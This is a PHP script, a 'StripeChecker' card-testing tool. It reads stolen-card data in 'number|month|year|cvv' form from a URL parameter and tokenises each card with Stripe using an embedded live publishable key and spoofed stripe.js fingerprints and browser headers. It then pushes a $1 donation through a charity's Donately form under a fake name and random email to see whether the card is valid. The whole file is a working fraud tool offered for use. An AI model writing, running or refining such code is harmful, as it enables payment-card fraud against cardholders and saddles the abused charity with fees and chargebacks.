<?php

class StripeChecker {
    private $pk_live = 'pk_live_51MJjGSR9GTt0CcXJYNHenVaATXNyK43YPRgUBgoRQDtrLCnk7YZ8OL7uhrQF3BJAs8vT8dPoKjORWC9JlwSwRiKs00QjcCzQMX';
    private $account_id = 'act_f9b102ae7299';
    private $form_id = 'frm_5cb29a5d6955';

    private function generateGuid() {
        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
    }

    private function generateToken($cardData) {
        $ch = curl_init();
        
        $postFields = http_build_query([
            'card[number]' => $cardData['cc'],
            'card[cvc]' => $cardData['cvv'],
            'card[exp_month]' => $cardData['month'],
            'card[exp_year]' => $cardData['year'],
            'card[name]' => $cardData['name'],
            'card[address_country]' => 'US',
            'card[currency]' => 'USD',
            'guid' => $this->generateGuid(),
            'muid' => $this->generateGuid(),
            'sid' => $this->generateGuid(),
            'payment_user_agent' => 'stripe.js/d72854d2f1; stripe-js-v3/d72854d2f1; card-element',
            'time_on_page' => mt_rand(20000, 50000),
            'key' => $this->pk_live,
            '_stripe_version' => '2022-11-15'
        ]);

        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://api.stripe.com/v1/tokens',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $postFields,
            CURLOPT_HTTPHEADER => [
                'Accept: application/json',
                'Content-Type: application/x-www-form-urlencoded',
                'Origin: https://js.stripe.com',
                'Referer: https://js.stripe.com/',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ]
        ]);

        $response = curl_exec($ch);
        curl_close($ch);
        
        return json_decode($response, true);
    }

    private function chargeCard($token, $userData) {
        $ch = curl_init();
        
        $payload = [
            'campaign_id' => null,
            'fundraiser_id' => null,
            'dont_send_receipt_email' => false,
            'first_name' => $userData['first_name'],
            'last_name' => $userData['last_name'],
            'email' => $userData['email'],
            'currency' => 'USD',
            'recurring' => false,
            'country' => 'US',
            'payment_auth' => json_encode(['stripe_token' => $token]),
            'form' => json_encode([
                'version' => '5.8.117',
                'id' => $this->form_id
            ])
        ];

        $url = "https://api.donately.com/v2/donations?" . http_build_query([
            'account_id' => $this->account_id,
            'donation_type' => 'cc',
            'amount_in_cents' => 100,
            'form_id' => $this->form_id,
            'x1' => md5(uniqid())
        ]);

        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($payload),
            CURLOPT_HTTPHEADER => [
                'Accept: */*',
                'Content-Type: application/json; charset=UTF-8',
                'Donately-Version: 2022-12-15',
                'Origin: https://www-christwaymission-com.filesusr.com',
                'Referer: https://www-christwaymission-com.filesusr.com/',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ]
        ]);

        $response = curl_exec($ch);
        curl_close($ch);
        
        return json_decode($response, true);
    }

    public function processCard($cc, $month, $year, $cvv) {
        // User data
        $userData = [
            'first_name' => 'Richard',
            'last_name' => 'Biven',
            'email' => 'test' . rand(1000,9999) . '@gmail.com'
        ];

        // Step 1: Generate Token
        $tokenResponse = $this->generateToken([
            'cc' => $cc,
            'month' => $month,
            'year' => $year,
            'cvv' => $cvv,
            'name' => $userData['first_name'] . ' ' . $userData['last_name']
        ]);

        if (!isset($tokenResponse['id'])) {
            return [
                'success' => false,
                'message' => 'Token generation failed',
                'error' => $tokenResponse['error']['message'] ?? 'Unknown error'
            ];
        }

        // Step 2: Charge Card
        $chargeResponse = $this->chargeCard($tokenResponse['id'], $userData);

        return [
            'success' => !isset($chargeResponse['type']) || $chargeResponse['type'] !== 'bad_request',
            'message' => $chargeResponse['message'] ?? 'Transaction successful',
            'response' => $chargeResponse
        ];
    }
}

// Usage
$checker = new StripeChecker();

if (isset($_GET['lista'])){
    $lista = $_GET['lista'];
    $cardDetails = explode('|', $lista);
    if(count($cardDetails) === 4){
        $cc = $cardDetails[0];
        $month = $cardDetails[1];
        $year = $cardDetails[2];
        $cvv = $cardDetails[3];

        $result = $checker->processCard($cc, $month, $year, $cvv);
        echo json_encode($result, JSON_PRETTY_PRINT);
    }else{
        echo json_encode(['success' => false, 'message' => 'Invalid card details']);
    }
}else{
    echo json_encode(['success' => false, 'message' => 'No card details provided']);
}

?>